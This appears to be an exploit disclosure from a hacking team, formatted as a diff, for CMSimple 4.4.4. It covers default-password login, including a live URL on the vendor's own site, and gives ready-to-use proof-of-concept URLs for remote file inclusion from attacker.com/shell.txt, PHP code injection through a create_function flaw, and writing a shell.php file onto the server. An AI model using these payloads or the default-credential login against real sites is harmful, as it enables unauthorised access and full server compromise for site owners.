@@ -1,0 +1,98 @@
+##################################################################################################
+#
+#Exploit Title : CMSimple 4.4.4 various security vulnerability
+#Author        : Govind Singh aka NullPort
+#Vendor        : http://cmsimple.org/
+#Download Link : http://www.cmsimple.org/downloadcounter/dlcount/count.php?id=31
+#Date          : 26/07/2014
+#Discovered at : IHT Lab ( 1ND14N H4X0R5 T34M )
+#Love to       : Manish Tanwar, DeadMan India, Hardeep Singh, Amit Kumar Achina , Jitender Dangi
+#Greez to      : All IHT Members 
+#           
+###################################################################################################
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Indian Haxors Team~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Weak Authentication :
+
+Any user can login just with simple password "test" which is the default cms password & there own vendor site is vulnerable with weak authentication 
+just login without user name & also with default password "test" here "http://cmsimple.org/2author/?Welcome_to_CMSimple&login" :p 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Indian Haxors Team~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Remote file Inclusion ::
+
+vulnerable file "http://www.example.com/CMSimple/plugins/filebrowser/classes/required_classes.php"
+
+Vulnerable Code :
+-----------------------------------vulnerable Code----------------------------------------
+
+        require_once $pth['folder']['plugin'] . 'classes/filebrowser_view.php';
+        require_once $pth['folder']['plugin'] . 'classes/filebrowser.php';
+
+exploit Code :
+-------------------------------------PoC----------------------------------------
+
+http://www.example.com/CMSimple/plugins/filebrowser/classes/required_classes.php?pth[folder][plugin]=http://attacker.com/shell.txt?
+
+also embedded These files :
+    CMSimple/2lang/index.php
+    CMSimple/2site/index.php
+    CMSimple/cmsimple/cms.php
+    CMSimple/index.php
+    CMSimple/plugins/index.php
+  
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Indian Haxors Team~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Remote Code Execution ::
+
+vulnerable file "http://www.example.com/CMSimple/2author/index.php" 
+
+An attacker might execute arbitrary PHP code with this vulnerability. User tainted data is embedded into a function that compiles PHP code on the run and executes it thus allowing an attacker to inject own PHP code that will be executed. 
+This vulnerability can lead to full server compromise.
+
+Vulnerable Code:
+-------------------------------------vulnerable code---------------------------------------
+    1320: preg_replace $c[$s] = preg_replace($words, '<span style="background: ' . $cmsimple_highlight_bg . '; color: ' . $cmsimple_highlight_tx . ';">\\0</span>', $c[$s]);  // functions.php
+        1316: $words = array_map(create_function('$w', 'return "&".$w."(?!([^<]+)?>)&isU";'), $words);  // functions.php
+            1315: $words = explode(',', urldecode($_GET['search']));  // functions.php
+        1308:  function content($cmsimple_highlight_bg = NULL, $cmsimple_highlight_tx = NULL)
+        1308:  function content($cmsimple_highlight_bg = NULL, $cmsimple_highlight_tx = NULL)
+--------------------------------------vulnerable Code---------------------------------------
+    1324: preg_replace $c[$s] = preg_replace($words, '<span class="highlight_search">\\0</span>', $c[$s]);  // functions.php
+        1316: $words = array_map(create_function('$w', 'return "&".$w."(?!([^<]+)?>)&isU";'), $words);  // functions.php
+            1315: $words = explode(',', urldecode($_GET['search']));  // functions.php
+    
+
+
+
+-------------------------------PoC:------------------------------ 
+http://www.example.com/CMSimple/2author/index.php?color=';phpinfo();//
+
+also effect these files :
+    CMSimple/2lang/index.php
+    CMSimple/2site/index.php
+    CMSimple/2site2lang/index.php
+    CMSimple/cmsimple/cms.php
+    CMSimple/cmsimple/functions.php
+    CMSimple/index.php
+  
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Indian Haxors Team~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+File Manipulation ::
+
+http://www.example.com/CMSimple/2author/index.php
+http://www.example.com/CMSimple/cmsimple/adm.php
+http://www.example.com/CMSimple/cmsimple/login.php
+http://www.example.com/CMSimple/plugins/filebrowser/classes/filebrowser.php
+
+---------------------------------PoC----------------------------------
+http://www.example.com/CMSimple/2author/index.php?file=shell.php&data=<?php phpinfo();?>
+
